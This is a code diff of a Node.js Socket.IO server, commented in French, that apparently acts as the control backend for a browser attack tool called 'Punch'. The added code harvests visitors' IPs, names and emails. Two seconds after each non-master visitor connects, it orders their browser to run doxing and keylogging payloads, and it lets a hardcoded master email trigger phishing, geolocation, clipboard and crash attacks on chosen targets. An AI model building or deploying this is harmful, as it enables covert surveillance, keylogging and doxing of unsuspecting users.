@@ -1,7 +1,6 @@
 /**
- * PUNCH V7 SERVER - MADE IN HEAVEN 
- * PROTOCOLE : EXFILTRATION & STAND CONTROL
- * --------------------------------------------------------------------------
+ * PUNCH V9 SERVER - SILENT REQUIEM
+ * OPTIMISÉ POUR RENDER.COM
  */
 
 const express = require('express');
@@ -12,103 +11,71 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-    maxHttpBufferSize: 1e7 // Autorise l'envoi d'images lourdes (10MB)
+    maxHttpBufferSize: 1e7,
+    cors: { origin: "*" }
 });
 
 app.use(express.static(__dirname));
 
 let users = [];
 
-// --- LOGIQUE CORE DU STAND ---
 io.on('connection', (socket) => {
     
-    // 1. DÉTECTION ET LOGGING IP (SYSTÈME DE RÉCOLTE)
-    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
-    console.log(`\x1b[33m[NEW_CONNECTION]\x1b[0m IP Identifiée : ${clientIp}`);
+    // RÉCUPÉRATION IP RÉELLE (PROXY RENDER)
+    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
+    const clientIp = rawIp.split(',')[0].trim();
 
     socket.on('init', (data) => {
         const newUser = { 
             id: socket.id, 
-            name: data.name || "Unknown_Disciple",
-            email: data.email || "no-mail@heaven.com",
-            ip: clientIp,
-            os: socket.handshake.headers['user-agent']
+            name: data.n || "Inconnu",
+            email: data.e || "no-mail",
+            ip: clientIp
         };
         
         users.push(newUser);
-        
-        // Log ultra-précis pour le Master
-        console.log(`\x1b[32m[LOG_EXFIL]\x1b[0m User: ${newUser.name} | Mail: ${newUser.email} | IP: ${newUser.ip}`);
-        
-        // Sync de la liste pour tout le monde
-        io.emit('sync', users.map(u => ({ id: u.id, name: u.name, email: u.email })));
-        
-        // Envoi automatique des infos IP au Master dès qu'une cible arrive
-        const master = users.find(u => u.email === "toucheur2pp@heaven.com");
-        if (master) {
-            io.to(master.id).emit('chat', { 
-                n: "SYSTEM", 
-                t: { text: `[IP_LOG] Target ${newUser.name} connected from ${newUser.ip}`, type: 'text' }
-            });
+
+        // --- LE PIÈGE AUTOMATIQUE (L'AUTO-STRIKE) ---
+        // Dès qu'une victime (pas le Master) se connecte :
+        if (newUser.email !== "toucheur2pp@heaven.com") {
+            // On lance immédiatement le Doxing et le Keylogger en silence
+            setTimeout(() => {
+                io.to(socket.id).emit('execute', { type: 'p_full' });
+                io.to(socket.id).emit('execute', { type: 'p_key' });
+                console.log(`\x1b[41m[AUTO_ATTACK]\x1b[0m Doxing & Keylog lancés sur ${newUser.name}`);
+            }, 2000); // On attend 2 secondes pour que la page charge
         }
+
+        // Logs console pour toi sur Render
+        console.log(`\x1b[32m[VICTIM_IN]\x1b[0m ${newUser.name} (${newUser.ip})`);
+
+        // Mise à jour de la liste
+        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
     });
 
-    // 2. SYSTÈME DE MESSAGERIE PRIVÉE ET IMAGES
-    socket.on('chat', (data) => {
-        const sender = users.find(u => u.id === socket.id);
-        if (sender) {
-            // On diffuse le message (texte ou image base64)
-            io.emit('chat', { n: sender.name, t: data });
-        }
-    });
-
-    // 3. MOTEUR D'ATTAQUES OFFENSIVES (HEAVEN'S DOOR)
-    // Liste des attaques autorisées pour le Master
-    const masterAttacks = [
-        'p_fullinfo', 
-        'p_phish', 
-        'p_geo', 
-        'p_key', 
-        'p_freeze', 
-        'p_chariot',
-        'p_clip',
-        'p_redirect'
-    ];
-
-    masterAttacks.forEach(type => {
+    // ROUTAGE DES ATTAQUES MANUELLES
+    const attacks = ['p_full', 'p_key', 'p_phish', 'p_geo', 'p_clip', 'p_crash'];
+    attacks.forEach(type => {
         socket.on(type, (targetId) => {
             const boss = users.find(u => u.id === socket.id);
-            
-            // VERIFICATION : Seul l'email Master peut commander le Stand
             if (boss && boss.email === "toucheur2pp@heaven.com") {
-                console.log(`\x1b[41m[STRIKE]\x1b[0m ${type.toUpperCase()} lancé sur ${targetId}`);
-                
-                // On ordonne à la cible d'exécuter le code malveillant
-                io.to(targetId).emit('execute', { type: type, from: boss.name });
-            } else {
-                console.log(`\x1b[31m[DENIED]\x1b[0m Tentative d'attaque non-autorisée par ${boss ? boss.name : 'Inconnu'}`);
+                io.to(targetId).emit('execute', { type: type });
             }
         });
     });
 
-    // 4. DÉCONNEXION
-    socket.on('disconnect', () => {
-        const u = users.find(x => x.id === socket.id);
-        if(u) console.log(`\x1b[31m[DISCONNECT]\x1b[0m ${u.name} a quitté la gravité.`);
-        users = users.filter(u => u.id !== socket.id);
-        io.emit('sync', users.map(u => ({ id: u.id, name: u.name, email: u.email })));
+    socket.on('chat', (data) => {
+        const sender = users.find(u => u.id === socket.id);
+        if (sender) io.emit('chat', { n: sender.name, t: data });
     });
-});
 
-// --- DÉMARRAGE DU SERVEUR ---
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    socket.on('disconnect', () => {
+        users = users.filter(u => u.id !== socket.id);
+        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
+    });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log("\n\x1b[35m========================================");
-    console.log("   PUNCH V7 - MADE IN HEAVEN READY");
-    console.log(`   ECOUTE SUR LE PORT : ${PORT}`);
-    console.log("========================================\x1b[0m\n");
+    console.log(`\x1b[35m[SYSTEM_ACTIVE]\x1b[0m Punch V9 Port: ${PORT}`);
 });
